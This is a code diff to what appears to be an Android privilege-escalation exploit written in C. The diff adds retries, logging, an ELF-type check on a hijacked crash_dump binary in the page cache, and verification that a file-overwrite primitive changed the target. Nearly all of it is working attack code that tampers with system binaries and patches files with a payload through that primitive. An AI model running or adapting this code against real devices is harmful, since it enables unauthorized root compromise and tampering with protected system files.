@@ -90,23 +90,48 @@ static int spawn_crash_dump(off64_t offset, int write_fd, int target_fd, const c
         _exit(9);
     }
     int st = 0;
-    TEMP_FAILURE_RETRY(waitpid(pid, &st, 0));
+    int wr = (int)TEMP_FAILURE_RETRY(waitpid(pid, &st, 0));
+    if (wr != pid)
+        printf("bridge waitpid ret=%d errno=%d pid=%d (status stale!)\n", wr, errno, pid);
     if (!(WIFEXITED(st) && WEXITSTATUS(st) == 0))
         printf("bridge(%s) off=%s status=0x%x\n", mode ? mode : "splice", offstr, st);
     return st;
 }
 
+/* ELF identity of whatever is currently sitting in the bridge's page cache.
+ * Our splicehelper is a static ET_EXEC (e_type 2); the stock crash_dump32 is a
+ * PIE (e_type 3). If the page cache got evicted and re-read from disk, the
+ * exploit would silently be exec'ing the original binary. */
+static void dump_bridge_ident(void)
+{
+    int fd = open(kCrashDump, O_RDONLY);
+    if (fd < 0) { printf("bridge ident: cannot open %s\n", kCrashDump); return; }
+    unsigned char b[20] = {0};
+    ssize_t n = pread(fd, b, sizeof(b), 0);
+    close(fd);
+    if (n != (ssize_t)sizeof(b)) { printf("bridge ident: short read %zd\n", n); return; }
+    unsigned e_type = (unsigned)b[16] | ((unsigned)b[17] << 8);
+    printf("bridge ident: e_type=%u (%s) magic=%02x%02x%02x\n", e_type,
+           e_type == 2 ? "our helper" : e_type == 3 ? "STOCK crash_dump - page cache reverted!" : "?",
+           b[1], b[2], b[3]);
+}
+
 /* Read 16 bytes from vendor file at offset using crash_dump bridge (read mode).
  */
 static int read_vendor_content(off64_t offset, uint8_t buf[16]) {
+    off64_t off0 = offset;
     int rdpipe[2];
     if (pipe(rdpipe) < 0) { printf("pipe failed: %s\n", strerror(errno)); return -1; }
+    int rd0 = rdpipe[0], rd1 = rdpipe[1];
 
     int status = spawn_crash_dump(offset, rdpipe[1], 0, "r");
     close(rdpipe[1]);
-    int n = 0;
-    if (status >= 0 && WIFEXITED(status) && WEXITSTATUS(status) == 0)
+    int n = 0, rerr = 0;
+    if (status >= 0 && WIFEXITED(status) && WEXITSTATUS(status) == 0) {
+        errno = 0;
         n = (int)TEMP_FAILURE_RETRY(read(rdpipe[0], buf, 16));
+        rerr = errno;
+    }
     close(rdpipe[0]);
     if (status < 0) return -1;
     if (n != 16) {
@@ -121,8 +146,8 @@ static int read_vendor_content(off64_t offset, uint8_t buf[16]) {
             };
             int ec = WEXITSTATUS(status);
             const char *meaning = (ec <= 4 || ec == 9) ? exit_meanings[ec] : "unknown";
-            printf("read_vendor at 0x%llx got %d bytes: %s\n",
-                     (long long)offset, n, meaning);
+            printf("read_vendor at 0x%llx got %d bytes: %s (pipe %d/%d errno %d)\n",
+                     (long long)off0, n, meaning, rd0, rd1, rerr);
         } else if (WIFSIGNALED(status))
             printf("read_vendor at 0x%llx got %d bytes: signal %d\n",
                      (long long)offset, n, WTERMSIG(status));
@@ -231,7 +256,13 @@ static int patch_file_cbc(const char *path, const char *payload, size_t len,
         uint8_t old_content[16] = {0};
 
         if (use_helper) {
-            if (read_vendor_content(off, old_content) < 0) {
+            int rv = -1;
+            for (int t = 0; t < 3 && rv < 0; t++) {
+                if (t) { printf("read_vendor retry %d\n", t); usleep(2000); }
+                rv = read_vendor_content(off, old_content);
+            }
+            if (rv < 0) {
+                dump_bridge_ident();
                 rc = -1; break;
             }
         } else {
@@ -252,6 +283,22 @@ static int patch_file_cbc(const char *path, const char *payload, size_t len,
                    (unsigned long)((uint64_t)off >> 32),
                    (unsigned long)((uint64_t)off & 0xffffffffu));
             rc = -1; break;
+        }
+
+        if (i == 0) {
+            /* Did the primitive actually change what a later read sees? */
+            uint8_t chk[16] = {0};
+            int got = 0;
+            if (use_helper) {
+                got = (read_vendor_content(off, chk) == 0);
+            } else {
+                int vf = open(path, O_RDONLY);
+                if (vf >= 0) { got = pread64(vf, chk, 16, off) == 16; close(vf); }
+            }
+            printf("verify @0x%08lx%08lx: %s\n",
+                   (unsigned long)((uint64_t)off >> 32),
+                   (unsigned long)((uint64_t)off & 0xffffffffu),
+                   !got ? "read failed" : (memcmp(chk, desired, 16) == 0 ? "OK" : "MISMATCH"));
         }
     }
 
@@ -645,6 +692,7 @@ static int setup(int argc, char **argv) {
     libcxx_ko_target[63] = '\0';
 
     printf("=== setup ===\n");
+    printf("payload build: " __DATE__ " " __TIME__ " (arm32=%d)\n", DF_TARGET32);
     printf("found ko_target: %s\n", ko_target);
     printf("encap port: %d\n", encap_port);
     printf("spi: 0x%x\n", spi);
